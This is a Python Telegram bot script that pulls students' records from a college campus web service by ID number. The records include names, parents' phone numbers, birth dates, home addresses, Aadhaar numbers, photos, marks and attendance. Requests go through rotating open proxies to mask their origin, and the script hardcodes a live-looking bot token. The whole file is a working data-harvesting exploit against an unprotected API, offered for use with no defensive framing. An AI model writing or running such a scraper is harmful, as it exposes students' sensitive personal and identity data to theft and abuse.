import os
import json
import base64
import requests
import numpy as np
import cv2
from tabulate import tabulate
import json as jsond 
import time  
import binascii 
from uuid import uuid4  
import platform  
import subprocess  
import hmac 
import sys
import hashlib
import random
from telegram.ext import Updater  
from telegram import Update  
from telegram.ext import CallbackContext  
from telegram.ext import CommandHandler  
from telegram.ext import MessageHandler  
from telegram.ext import filters as Filters
the_updater = Updater("6301436964:AAEda-LqpSgze8NRYCrE4XyUvKnsPraCbfo",use_context = True)  

    
def get_full_response(url):
    try:
        list_proxy = ["112.245.48.74:9002",
                        "112.19.214.109:9002",
                        "185.165.58.182:8080",
                        "120.202.128.112:9002",
                        "114.55.84.12:30001",
                        "117.160.250.132:80",
                        "117.159.15.99:9091",
                        "47.100.91.57:8080",
                        "194.233.81.116:14344"]
        global proxy
        proxy= random.choice(list_proxy)
        response = requests.get(url ,proxies={"http":proxy})
        return response
    except requests.RequestException as e:
        print("Error:", e)
        return None
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')   


def print_attendance(response_text,update:Update,context:CallbackContext):
    try:
        response_data = json.loads(response_text)
        if "Details" in response_data:
            details = response_data["Details"]
            for data in details:
                attendance_percentage = data.get("per", "")
                update.message.reply_text(attendance_percentage)
    except json.JSONDecodeError:
       update.message.reply_text("Error: Invalid JSON response")
global baap
baap="0211BCA111"
def student(update:Update,context:CallbackContext):
    if len(update.message.text)>9:

        if update.message.chat.username=="Udit9911":
                erp=update.message.text[9:]
                if erp.lower()==baap.lower():
                    print("Owner ki ID Search Krega")
                    
                url = f"https://www.bvimrcampus.com/BVIMRService/BVIMRServiceAnd.asmx/fn_Profile?UserID={erp}&UserType=Student"

                response = get_full_response(url)
                response_data = response.text
                pic = json.loads(response.text)


                   




                parsed_response = json.loads(response_data)


                if parsed_response["Status"] == "1":
                    profiles = parsed_response["Details"]
                    picture = pic["Details"][0]["Picture"]

                    for profile in profiles:
                        reply=        f'''Name:{profile["Name"]
                        }\nProgram:{ profile["Program"]
                        }\nBranch:{ profile["Branch"]
                        }\nSemester:{ profile["Semester"]
                        }\nFatherName:{ profile["FatherName"]
                        }\nFatherMobile:{ profile["FatherMobile"]
                        }\nInstitute:{ profile["Institute"]
                        }\nDOB:{ profile["DOB"]
                        }\nStudent eMail:{ profile["Student eMail"]
                        }\nStudent Mobile:{ profile["Student Mobile"]
                        }\nPer. Address:{ profile["Per. Address"]
                        }\nCorr Address:{ profile["Corr Address"]
                        }\n AdmNo:{ profile["AdmNo"]
                      } adm_gender:{ profile["adm_gender"]
                     } Batch:{ profile["Batch"]
                     } Aadhaar No:{ profile["Aadhaar No"]
                     } Proxy used = {proxy}'''
                        update.message.reply_text(reply)
                        try:
                            decoded_image_data = base64.b64decode(picture)
                            with open('temp_image.png', 'wb') as f:
                                f.write(decoded_image_data)
                                with open('temp_image.png', 'rb') as f:
                                    update.message.bot.send_photo(update.message.chat_id,f)
                            os.remove('temp_image.png')
                        except Exception as e:
                            print("Error:", e)
                else:
                    update.message.reply_text("No record found.")
    else:
         
         update.message.reply_text( "Enter Username Also")
def print_attendance(update:Update,context:CallbackContext):
    try:
        if len(update.message.text)>12: 

            if update.message.chat.username=="Udit9911":
                string=update.message.text[12:]
                space_index = string.find(" ")
                erp = string[:space_index]
                sem = string[space_index + 1:]
                if erp.lower()==baap.lower():
                    update.message.reply_text("Owner ki ID Search Krega")
                else:
                    url = f"https://www.bvimrcampus.com/BVIMRService/BVIMRServiceAnd.asmx/getAttendanceAfterAddedEvent?UserID={erp}&SemesterID=CS0{sem}"
                    
                    response = get_full_response(url)

                    response_ = response.text
                    
                    response_data = json.loads(response_)
                    if "Details" in response_data:
                        details = response_data["Details"]
                        for data in details:
                            attendance_percentage = data.get("per", "")
                            update.message.reply_text(attendance_percentage)
    except json.JSONDecodeError:
        update.message.reply_text("Error: Invalid JSON response")

def marks(update:Update,context:CallbackContext):
    try:
        if len(update.message.text)>7:

            if update.message.chat.username=="Udit9911":
                string=update.message.text[7:]
                space_index = string.find(" ")
                erp = string[:space_index]
                sem = string[space_index + 1:]
                if erp.lower()==baap.lower():
                    update.message.reply_text("Owner ID Search Krega")
                else:
                    url = f"http://www.bvimrcampus.com/BVIMRService/BVIMRServiceAnd.asmx/GetStudentMarks1?UserID={erp}&SemesterID=CS0{sem}"
                            
                    response = get_full_response(url)
                    response_data = response.text

                    response_ = json.loads(response_data)

                    if "Details" in response_:
                            details = response_["Details"]
                            main=""
                            for data in details:
                                subject = data.get("Subject", "")
                                exam = data.get("Exam", "")
                                marks = data.get("Marks", "")
                                reply=f'''\nSubject: {subject}\nExam: {exam}\nMarks: {marks} \n ================================='''
                                update.message.reply_text(reply)
                               
                            

                   
    except:
        update.message.reply_text("error")



def start(update:Update,context:CallbackContext):
     update.message.reply_text("Hi")
the_updater.dispatcher.add_handler(CommandHandler('student', student))
the_updater.dispatcher.add_handler(CommandHandler('attandance', print_attendance))
the_updater.dispatcher.add_handler(CommandHandler('marks', marks))
the_updater.dispatcher.add_handler(CommandHandler('start', start))



  
the_updater.start_polling()  
